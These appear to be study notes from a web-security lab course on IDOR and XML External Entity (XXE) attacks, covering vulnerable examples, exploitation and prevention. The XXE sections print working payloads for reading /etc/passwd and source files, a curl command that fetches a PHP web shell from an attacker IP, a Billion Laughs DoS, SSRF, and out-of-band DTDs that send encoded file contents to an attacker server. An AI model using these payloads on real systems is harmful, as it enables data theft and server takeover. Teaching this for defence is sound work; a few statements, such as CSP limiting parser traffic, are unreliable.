- **Goal**: Prevent Insecure Direct Object Reference (IDOR) vulnerabilities by implementing robust **access control** and **secure object referencing**.
- **Root Cause**: IDOR vulnerabilities stem from improper back-end access control, allowing attackers to manipulate object references to access unauthorized data or perform actions as other users.

---

## 2. Object-Level Access Control (OLAC)

### 2.1 Importance of Access Control

- **Purpose**: Ensure every request to access or modify data is authorized based on user roles and privileges.
- **Role-Based Access Control (RBAC)**: Assigns roles to users, each with specific permissions to access certain objects or resources.

### 2.2 Implementing Object-Level Access Control

- **Key Concept**: The back-end server must check the user's **role and permissions** against the object they are trying to access.
- **RBAC Example (JavaScript)**:
    
    ```jsx
    match /api/profile/{userId} {
        allow read, write: if user.isAuth == true
        && (user.uid == userId || user.roles == 'admin');
    ```
    
- The system checks if:
    1. The user is authenticated (`user.isAuth == true`).
    2. The user's `uid` matches the requested object (`user.uid == userId`).
    3. The user has the `admin` role.
- If any condition is met, the user gains read/write access.

### 2.3 Safer Access Control Practices

- **Avoid**:
    - Storing user roles or privileges in client-side cookies or request payloads (prone to tampering).
- **Recommended**:
    - Fetch user roles directly from the back-end using session tokens or server-side validation.
    - Map user roles from the RBAC during **each request**.

---

## 3. Secure Object Referencing

### 3.1 Direct Object Referencing Issues

- **Problem**: Direct references (e.g., `uid=1`) expose object IDs, allowing enumeration and unauthorized access.
- **Example of Insecure Code**:
    
    ```php
    $uid = intval($_REQUEST['uid']);
    $query = "SELECT url FROM documents where uid=" . $uid;
    $result = mysqli_query($conn, $query);
    $row = mysqli_fetch_array($result);
    echo "<a href='" . $row['url'] . "' target='_blank'></a>";
    ```
    
- **Risk**: Incrementing or altering `uid` can reveal other users' documents.

---

### 3.2 Secure Object Referencing Methods

1. **Use UUIDs (Universally Unique Identifiers)**:
    - Example (UUID v4):
        
        ```
        89c9b29b-d19f-4515-b2dd-abb6e693eb20
        ```
        
    - **Benefit**: UUIDs are unpredictable, preventing enumeration.
    - **Implementation**:
        - Map UUIDs to object records in the database.
        - Replace numeric IDs (`uid=1`) with UUIDs (`uid=89c9b29b...`).
2. **Salting and Hashing**:
    - Generate a salted hash for each object reference during creation.
    - Example (PHP):
        
        ```php
        $uuid = bin2hex(random_bytes(16)); // Generate secure random UUID
        ```
        
    - Store the generated UUID in the database alongside the object.
3. **Example of Secure Referencing**:
    
    ```php
    $uuid = $_REQUEST['uuid'];
    $query = "SELECT url FROM documents WHERE uuid='" . mysqli_real_escape_string($conn, $uuid) . "'";
    $result = mysqli_query($conn, $query);
    $row = mysqli_fetch_array($result);
    echo "<a href='" . $row['url'] . "' target='_blank'></a>";
    ```
    

---

## 4. Key Principles of IDOR Mitigation

1. **Least Privilege Access**:
    - Users should have the minimum level of access necessary for their role.
    - Regularly audit roles and permissions.
2. **Server-Side Validation**:
    - Always validate user privileges on the back-end.
    - Compare the requested object’s ownership against the user's session.
3. **Avoid Calculations on the Client Side**:
    - Never perform security checks, hash generation, or role assignments in front-end JavaScript.
    - Generate and store references server-side.
4. **Logging and Monitoring**:
    - Log access to sensitive resources.
    - Monitor for abnormal patterns, such as sequential access to object references.

---

## Final Thoughts

- **Access Control First**: Secure object referencing is **not enough** without a robust access control system.
- **Layered Security**: Implement access control, secure referencing, and logging as part of a **defense-in-depth** approach.
- **Ongoing Process**: Regularly update and test access control mechanisms as the web application evolves.

---

# XML External Entity (XXE) Injection

- **Definition**: XXE Injection vulnerabilities occur when user-controlled XML data is processed without proper sanitization or secure parsing. This allows attackers to exploit XML features to perform malicious actions.
- **Potential Impact**:
    - Disclosure of sensitive files.
    - Server-side request forgery (SSRF).
    - Denial of service (DoS).
    - Full system compromise.
- **Significance**: Recognized by **OWASP** as one of the **Top 10 Web Security Risks**.

---

## 1. XML Basics

- **Purpose**: XML (Extensible Markup Language) stores and transports data in a structured format, often used in APIs and web services.
- **Structure**:
    - **Root Element** – The main enclosing tag.
    - **Child Elements** – Nested tags representing data.
- **Example** (E-mail XML Structure):
    
    ```xml
    <?xml version="1.0" encoding="UTF-8"?>
    <email>
      <date>01-01-2022</date>
      <time>10:00 am UTC</time>
      <sender>john@inlanefreight.com</sender>
      <recipients>
        <to>HR@inlanefreight.com</to>
        <cc>
          <to>billing@inlanefreight.com</to>
          <to>payslips@inlanefreight.com</to>
        </cc>
      </recipients>
      <body>
      Hello,
      Kindly share with me the invoice for the payment made on January 1, 2022.
      Regards,
      John
      </body>
    </email>
    ```
    

**Key XML Components:**

| **Key** | **Definition** | **Example** |
| --- | --- | --- |
| **Tag** | XML keys enclosed by `<` and `>` | `<date>` |
| **Entity** | XML variables enclosed by `&` and `;` | `&lt;` |
| **Element** | Data stored between a start and end tag | `<time>10:00 am UTC</time>` |
| **Attribute** | Optional properties defined within a tag | `version="1.0"` |
| **Declaration** | XML version and encoding specified at the start | `<?xml version="1.0"?>` |

---

## 2. Document Type Definition (DTD)

- **Purpose**: Defines the structure and rules for XML documents.
- **Usage**: Can be embedded within the XML document or referenced externally.
- **Example DTD** (Internal DTD defining email structure): (Email above ^)
    
    ```xml
    <!DOCTYPE email [
      <!ELEMENT email (date, time, sender, recipients, body)>
      <!ELEMENT recipients (to, cc?)>
      <!ELEMENT cc (to*)>
      <!ELEMENT date (#PCDATA)>
      <!ELEMENT time (#PCDATA)>
      <!ELEMENT sender (#PCDATA)>
      <!ELEMENT to  (#PCDATA)>
      <!ELEMENT body (#PCDATA)>
    ]>
    ```
    
- **Referencing it this way:**
    
    ```xml
    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE email SYSTEM "email.dtd">
    ```
    
- **It is also possible to reference a DTD through a URL, as follows:**
    
    ```xml
    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE email SYSTEM "http://inlanefreight.com/email.dtd">
    ```
    

---

## 3. XML Entities

- **Purpose**: Variables in XML documents used to reduce repetitive data.
- **Internal Entity Example**:
    
    ```xml
    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE email [
      <!ENTITY company "Inlane Freight">
    ]>
    ```
    
- **Usage**:
The entity `&company;` is replaced by "Inlane Freight" when parsed.
    
    ```xml
    <sender>&company;</sender>
    ```
    
    However, we can `reference External XML Entities` with the **`SYSTEM`** keyword, which is followed by the external entity's path, as follows:
    
    ```json
    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE email [
      <!ENTITY company SYSTEM "http://localhost/company.txt">
      <!ENTITY signature SYSTEM "file:///var/www/html/signature.txt">
    ]>
    ```
    

---

## 4. XXE Attack Path

- **Mechanism**:
    - An attacker injects malicious external entity references into XML input.
    - The XML parser fetches and includes external files in the response, leaking sensitive information.
- **Target Areas**:
    - **SOAP APIs**
    - **Web Forms**
    - **File Uploads**

---

## 5. Key Takeaways

- **DTD**: Defines rules for XML structure, supporting internal and external entities.
- **Entities**: Can reference external files, enabling data leaks and attacks.
- **XXE**: Occurs when untrusted XML data is parsed insecurely, allowing attackers to access server files or conduct SSRF attacks.

---

# Local File Disclosure and XXE Exploitation

## 1. Introduction to Local File Disclosure through XXE

- **Goal**: Exploit XXE vulnerabilities to access and disclose sensitive local files from the server.
- **Mechanism**: Inject external XML entities that reference system files or source code, allowing attackers to read them when parsed by the XML processor.

---

## 2. Identifying XXE Vulnerabilities

- **Target**: Web pages or forms that accept **XML input** (e.g., contact forms or API endpoints).
- **Testing**:
    1. Fill and submit a form.
    2. Intercept the request with Burp Suite.
    3. Check for XML-based payloads in the request body.
    4. Identify reflected elements (e.g., `<email>`), which may serve as injection points.

![We can see that it’s using the <email> element to display back to us the email. This can be an element we can Inject into.](image%20127.png)

We can see that it’s using the <email> element to display back to us the email. This can be an element we can Inject into.

---

## 3. Internal Entity Injection – Proof of Concept

- **Goal**: Define and inject custom entities to confirm XML injection.
- **Payload** (Define Internal Entity):
    
    ```xml
    <!DOCTYPE email [
      <!ENTITY company "Inlane Freight">
    ]>
    ```
    
- **Injection Point**:
    
    ```xml
    <email>&company;</email>
    ```
    
- **Expected Response**:
    - If vulnerable, `Inlane Freight` is reflected in the HTTP response.
    - If not vulnerable, `&company;` is shown as raw text.

![image.png](image%20128.png)

**Note:** Some web applications may default to a JSON format in HTTP request, but may still accept other formats, including XML. So, even if a web app sends requests in a JSON format, we can try changing the `Content-Type` header to `application/xml`, and then convert the JSON data to XML with an [online tool](https://www.convertjson.com/json-to-xml.htm). If the web application does accept the request with XML data, then we may also test it against XXE vulnerabilities, which may reveal an unanticipated XXE vulnerability.

---

## 4. Reading Sensitive Files

- **Goal**: Inject external entities to read system files (e.g., `/etc/passwd`).
- **Payload (File Disclosure)**:
    
    ```xml
    <!DOCTYPE email [
      <!ENTITY company SYSTEM "file:///etc/passwd">
    ]>
    ```
    
    **`<email>&company;</email>`**
    
- **Expected Result**:
    - The content of `/etc/passwd` is displayed, confirming successful exploitation.
- **Tip**: In Java applications, directories may list their contents when referenced (e.g., `file:///var/www/html/`).

![image.png](image%20129.png)

---

## 5. Reading Source Code (White Box Pentest)

- **Problem**: Non-XML files (e.g., `.php`) contain special characters (`<`, `>`, `&`) that break XML parsing.
- **Solution**: Use PHP’s **php://filter** to **base64 encode** the file content.
- **Payload (Base64 Encode Source Code)**:
    
    ```xml
    <!DOCTYPE email [
      <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">
    ]>
    ```
    
    **`<email>&company;</email>`**
    
- **Decoding**:
    - Copy the base64 string and decode it using Burp's Inspector or an online base64 decoder.

---

## 6. Remote Code Execution (RCE)

- **Goal**: Upload a PHP shell to the target server using XML payloads.
- **Setup**:
    
    ```bash
    echo '<?php system($_REQUEST["cmd"]);?>' > shell.php
    sudo python3 -m http.server 80
    ```
    
- **Payload (Download Web Shell with Curl)**:
    
    ```xml
    <?xml version="1.0"?>
    <!DOCTYPE email [
      <!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'">
    ]>
    <root>
      <name></name>
      <tel></tel>
      <email>&company;</email>
      <message></message>
    </root>
    ```
    
- **Notes**:
    - `$IFS` replaces spaces to maintain valid XML syntax.
    - `expect` module is required for this method, but it is often disabled by default.

---

## 7. Denial of Service (DoS) with XXE

- **Goal**: Overload the server with recursive entity expansion (Billion Laughs Attack).
- **Full Payload**:
    
    ```xml
    <?xml version="1.0"?>
    <!DOCTYPE email [
      <!ENTITY a0 "DOS" >
      <!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
      <!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
      <!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
      <!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
      <!ENTITY a5 "&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;">
      <!ENTITY a6 "&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;">
      <!ENTITY a7 "&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;">
      <!ENTITY a8 "&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;">
      <!ENTITY a9 "&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;">
      <!ENTITY a10 "&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;">
    ]>
    <root>
      <name></name>
      <tel></tel>
      <email>&a10;</email>
      <message></message>
    </root>
    ```
    
- **Explanation**:
    - Entity `a0` recursively expands, overwhelming memory.
    - Modern web servers like Apache mitigate this attack by limiting entity expansion.

---

## 8. Server-Side Request Forgery (SSRF) via XXE

- **Goal**: Use XXE to perform SSRF by querying internal resources.
- **Payload (Access Internal Service)**:
    
    ```xml
    <!DOCTYPE email [
      <!ENTITY admin SYSTEM "http://localhost/admin">
    ]>
    <email>&admin;</email>
    ```
    
- **Result**:
    - Access internal services by leveraging SSRF through XXE injection.

---

## 9. Key Takeaways

- **Risks**: XXE can lead to file disclosure, RCE, SSRF, and DoS.
- **Targets**: Web forms, SOAP APIs, and file upload functions.
- **Mitigation**:
    - Disable **DTD processing** in XML parsers.
    - Use **secure XML libraries** and avoid resolving external entities.
    - Implement strict input validation for XML payloads.

---

# Advanced File Disclosure with XXE

## 1. Overview

- **Goal**: Extract sensitive data from files that are not easily accessible through basic XXE methods.
- **Challenges**:
    - Non-XML-compliant files (e.g., PHP source files).
    - Blind XML outputs (no reflection of XML entities).
    - Limited error handling or exception display.
- **Approach**:
    - Use **CDATA** for raw data exfiltration.
    - Employ **Parameter Entities** to bypass XML limitations.
    - Leverage **error-based XXE** for blind exfiltration.

---

## 2. Advanced Exfiltration with CDATA

### 2.1 Problem

- Some files (e.g., PHP scripts) contain special characters (`<`, `>`, `&`), causing XML parsing errors when referenced directly.

### 2.2 Solution

- Use **CDATA sections** to handle raw content, preventing XML parsing errors.

### 2.3 Payload Breakdown

- **Define Internal and External Entities**:
    
    ```xml
    <!DOCTYPE email [
      <!ENTITY begin "<![CDATA[">
      <!ENTITY file SYSTEM "file:///var/www/html/submitDetails.php">
      <!ENTITY end "]]>">
      <!ENTITY joined "&begin;&file;&end;">
    ]>
    ```
    
- **Issue**:
    - Internal (`&begin;`) and external (`&file;`) entities **cannot** be concatenated directly.

---

### 2.4 Bypassing with Parameter Entities

- **Parameter Entities** (`%`) can be concatenated even if one references an external file.
- **Payload** (External DTD for Bypassing Limitation):
    
    ```xml
    <!ENTITY joined "%begin;%file;%end;">
    ```
    

---

### 2.5 Exploit Workflow

1. **Create DTD File (xxe.dtd)**:
    
    ```bash
    echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
    python3 -m http.server 8000
    
    # 
    Serving HTTP on 0.0.0.0 port 8000 ...
    ```
    
2. **Reference External DTD and Extract File**:
    
    ```xml
    <!DOCTYPE email [
      <!ENTITY % begin "<![CDATA[">
      <!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php">
      <!ENTITY % end "]]>">
      <!ENTITY % xxe SYSTEM "http://OUR_IP:8000/xxe.dtd">
      %xxe;
    ]>
    ```
    
    **`<email>&joined;</email>`**
    
- **Result**:
    - The content of `submitDetails.php` is retrieved without encoding it as base64.
    - CDATA ensures proper handling of special characters, allowing raw data extraction.

This trick can become very handy when the basic XXE method does not work or when dealing with other web development frameworks. **`Try to use this trick to read other files`.**

---

## 3. Error-Based XXE

### 3.1 Problem

- Web applications that **do not reflect XML inputs** may be vulnerable but blind to entity-based file exfiltration.
- **Solution**:
    - Trigger **errors** to force file content disclosure by exploiting exception handling in XML parsing.

---

### 3.2 Initial Discovery – Inducing Errors

- **Payload (Malformed XML to Trigger Error)**:
    
    ```xml
    <roo>
      <email>&nonexistent;</email>
    </roo>
    ```
    
- **Outcome**:
    - Error messages reveal sensitive information (e.g., server paths or stack traces).

---

### 3.3 Exploiting Error-Based XXE

1. **Host External DTD for File Exfiltration**:
    
    ```xml
    <!ENTITY % file SYSTEM "file:///etc/hosts">
    <!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
    ```
    
2. **Reference DTD and Trigger Error**:
    
    ```xml
    <!DOCTYPE email [
      <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
      %remote;
      %error;
    ]>
    ```
    
3. **Workflow**:
    - The server attempts to resolve `%nonExistingEntity;` but fails, returning the error message along with the contents of the `/etc/hosts` file.

![image.png](image%20130.png)

---

This method may also be used to read the source code of files. All we have to do is change the file name in our DTD script to point to the file we want to read (e.g. `"file:///var/www/html/submitDetails.php"`). However, `this method is not as reliable as the previous method for reading source files`, as it may have length limitations, and certain special characters may still break it.

## 4. Key Concepts and Takeaways

### 4.1 Techniques Recap

- **CDATA Wrapping**: Extract raw, non-XML-conforming data.
- **Parameter Entities**: Overcome XML restrictions on external entity concatenation.
- **Error-Based XXE**: Exfiltrate files through error messages when standard entity reflection is unavailable.

---

### 4.2 Practical Use Cases

- **Source Code Exfiltration**: Read PHP, Python, or configuration files for additional vulnerabilities (e.g., API keys, database passwords).
- **Directory Enumeration**: Extract directory listings and file paths (e.g., Java applications).
- **Exfiltrating Sensitive Files**: Access files like `/etc/passwd`, `.ssh/id_rsa`, and `/var/log`.

---

# Blind Data Exfiltration with XXE

## 1. Overview

- **Goal**: Exfiltrate sensitive data from a server in blind XXE scenarios where:
    - The application does **not reflect XML entity output**.
    - **No errors** (e.g., PHP exceptions) are visible in the response.
- **Solution**: Use **Out-of-Band (OOB)** techniques to extract data by forcing the server to send the content to an external server (controlled by the attacker).

---

## 2. Out-of-Band (OOB) Data Exfiltration

### 2.1 Concept

- **Method**:
    1. Inject XML that triggers a **web request to an external server** controlled by the attacker.
    2. Encode file content (base64) and send it as part of the HTTP request.
    3. Decode the exfiltrated data received on the attacker's server.
- **Why It Works**: Even if no data is reflected on the vulnerable server, the outbound request can carry the exfiltrated content.

---

### 2.2 Payload Breakdown

- **Step 1**: Use a parameter entity to **read and encode** the target file.
- **Step 2**: Use an external entity to **send the encoded content** to the attacker's server.
- **Payload (Base64 Encode and Exfiltrate)**: (the **`xxe.dtd`** file)
    
    ```xml
    <!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
    <!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">
    ```
    

If, for example, the file we want to read had the content of `XXE_SAMPLE_DATA`, then the `file` parameter would hold its base64 encoded data (`WFhFX1NBTVBMRV9EQVRB`). When the XML tries to reference the external `oob` parameter from our machine, it will request `http://OUR_IP:8000/?content=WFhFX1NBTVBMRV9EQVRB`. Finally, we can decode the `WFhFX1NBTVBMRV9EQVRB` string to get the content of the file. We can even write a simple PHP script that automatically detects the encoded file content, decodes it, and outputs it to the terminal:

1. **Create a PHP Script to Decode Incoming Data**:
    
    ```php
    <?php
    if(isset($_GET['content'])){
        error_log("\n\n" . base64_decode($_GET['content']));
    }
    ?>
    ```
    
2. So, we will first write the above PHP code to **`index.php`**, and then start a PHP server on port **`8000`**, as follows:
    
    ```bash
    php -S 0.0.0.0:8000
    ```
    
3. **Craft the XML Payload to Trigger OOB Request**:
    
    ```xml
    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE email [
      <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
      %remote;
      %oob;
    ]>
    ```
    
    **`<root>&content;</root>`**
    
    ![image.png](image%20131.png)
    

![image.png](image%20132.png)

---

## 3. DNS OOB Exfiltration (Alternative)

- **Method**: Exfiltrate data by encoding it into **subdomains** of a controlled DNS server.
- **Example**:
    
    ```
    ENCODED_DATA.attacker-domain.com
    ```
    
- **Tool**: Use **tcpdump** to capture DNS requests and decode the subdomain data.
- **Pros**: Works even if the vulnerable server restricts HTTP outbound requests but allows DNS resolution.

---

## 4. Automating OOB Exfiltration (XXEInjector)

### 4.1 Using XXEinjector

1. **Clone the Tool**:
    
    ```bash
    git clone https://github.com/enjoiz/XXEinjector.git
    ```
    
2. **Prepare the HTTP Request**: we can copy the HTTP request from Burp and write it to a file for the tool to use. We should not include the full XML data, only the first line, and write `XXEINJECT` after it as a position locator for the tool:

```php
POST /blind/submitDetails.php HTTP/1.1
Host: 10.129.201.94
Content-Length: 169
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)
Content-Type: text/plain;charset=UTF-8
Accept: */*
Origin: http://10.129.201.94
Referer: http://10.129.201.94/blind/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

<?xml version="1.0" encoding="UTF-8"?>
XXEINJECT
```

1. Now, we can run the tool with the `--host`/`--httpport` flags being our IP and port, the `--file` flag being the file we wrote above, and the `--path` flag being the file we want to read. We will also select the `--oob=http` and `--phpfilter` flags to repeat the OOB attack we did above, as follows:
    
    ```bash
    ruby XXEinjector.rb --host=[10.10.14.217] --httpport=8000 --file=/home/darksidedani/Apps/XXEinjector/xxe.req --path=/etc/passwd --oob=http --phpfilter
    ```
    
2. **View Extracted Files**:
    
    ```bash
    cat Logs/10.129.201.94/etc/passwd.log
    ```
    

---

## 5. Key Concepts and Takeaways

### 5.1 Benefits of OOB XXE

- **Bypasses Blind Limitations**: Extract data even without reflected output or visible errors.
- **Stealth**: Minimal traces are left in application logs.
- **Versatility**: Can target configuration files, SSH keys, and sensitive system data.

### 5.2 Targets for Exfiltration

- `/etc/passwd` – User accounts.
- `/var/www/html/config.php` – Web application configurations.
- `.ssh/id_rsa` – SSH private keys.
- `database.yml` – Database credentials.

---

# XXE Prevention

## 1. Overview

- **Root Cause**: XXE vulnerabilities arise when untrusted XML input allows external entity references, which attackers exploit to read sensitive files or perform malicious actions.
- **Prevention Focus**: Unlike traditional vulnerabilities (e.g., XSS, SQLi), XXE vulnerabilities are largely caused by **outdated XML libraries** rather than insecure code practices.

---

## 2. Avoiding Outdated Components

### 2.1 XML Libraries – The Main Risk

- **Why It Matters**:
    - XML input is often processed by **built-in XML parsers** rather than custom code, meaning vulnerabilities stem from outdated libraries.
    - Developers might unknowingly introduce XXE by relying on deprecated or insecure parsing functions.
- **Example**:
    - In **PHP**, the function [`libxml_disable_entity_loader()`](https://www.php.net/manual/en/function.libxml-disable-entity-loader.php) is deprecated as of PHP 8.0.
    
    <aside>
    💡
    
    Warning: This function has been DEPRECATED as of PHP 8.0.0. Relying on this function is highly discouraged.
    
    </aside>
    
    - Outdated XML libraries may inadvertently allow external entity processing, leading to XXE vulnerabilities.

---

### 2.2 Keeping XML Libraries Updated

- **Key Practice**:
    - Regularly update all XML libraries and components that handle XML data.
    - Check for deprecated functions and migrate to **secure alternatives**.
- **Tools to Monitor Outdated Components**:
    - **Code Editors** (e.g., VSCode) – Highlight deprecated functions.
    - **Package Managers** (e.g., npm, Composer) – Notify of outdated dependencies.
- **OWASP Resource**:
    - Refer to the [**OWASP XXE Prevention Cheat Sheet**](https://owasp.org/www-project-cheat-sheets/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html) for a list of vulnerable XML libraries and recommendations.

---

## 3. Updating Related Components

- XML vulnerabilities can extend beyond parsers:
    - **API Libraries** (e.g., SOAP) – Older versions are prone to XXE vulnerabilities.
    - **File Processors** (e.g., SVG, PDF processors) – May parse XML internally and expose XXE risks.
    - **Document Converters** – Handle XML-based formats like Office files or SVG images.
- **Best Practice**:
    - Update **all components** that interact with XML, not just direct XML parsers.
    - Prioritize modern standards like **REST APIs** (JSON) over older XML-based protocols (e.g., SOAP).

---

## 4. Safe XML Configurations

### 4.1 Key XML Hardening Techniques

- **Disable External Entity Processing**: Prevent parsing of external entities in XML data.
- **Disable Custom DTDs**: Avoid custom Document Type Definitions, a common vector for XXE attacks.
- **Disable Parameter Entity Processing**: Blocks complex entity substitution (often used in blind XXE).
- **Prevent Entity Loops**: Restrict recursive entity declarations to avoid DoS attacks (Billion Laughs Attack).
- **Disable XInclude**: XInclude allows embedding external files into XML, posing similar risks to XXE.

### 4.2 Example – Java Secure XML Parsing Configuration

```java
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
dbf.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);

```

---

## 5. Exception Handling and Error Suppression

- **Error-Based XXE Risk**:
    - Applications that display **PHP errors** or runtime exceptions can leak sensitive data via XXE exploitation.
- **Solution**:
    - Implement **strict exception handling**.
    - **Suppress error messages** in production environments to prevent attackers from extracting sensitive data.
    - Log errors internally but do not expose them to users.

---

## 6. Alternative Data Formats

- **Mitigating XML Risks**:
    - Use **JSON or YAML** instead of XML for data exchange.
    - Transition from **SOAP (XML-based)** to **REST APIs (JSON-based)**.
- **Advantages**:
    - JSON and YAML do not support external entities by default, significantly reducing the risk of XXE.

---

## 7. Defense in Depth – Additional Mitigations

### 7.1 Web Application Firewalls (WAFs)

- **Role**:
    - A **WAF** can detect and block common XXE payloads by inspecting incoming requests.
    - Rules can filter XML data with external entity definitions (`<!DOCTYPE` or `SYSTEM`).
- **Limitation**:
    - WAFs can be bypassed, so they should only serve as **additional protection**, not the sole defense mechanism.

### 7.2 Content Security Policy (CSP)

- Prevent **outbound traffic** from XML parsers to limit potential OOB (Out-of-Band) XXE exfiltration.

---

## 8. Summary of XXE Prevention Techniques

| **Prevention Method** | **Description** |
| --- | --- |
| **Update XML Libraries** | Replace outdated or vulnerable XML libraries with secure versions. |
| **Disable DTD and External Entities** | Block custom DTDs and external entity resolution. |
| **Exception Handling** | Suppress error messages and use secure error logging. |
| **Switch to JSON/YAML** | Use JSON-based APIs (REST) instead of XML-based (SOAP). |
| **WAF Implementation** | Deploy WAF rules to detect and block malicious XML payloads. |
| **Secure XML Parsing** | Configure parsers to disable external entities and XInclude. |

---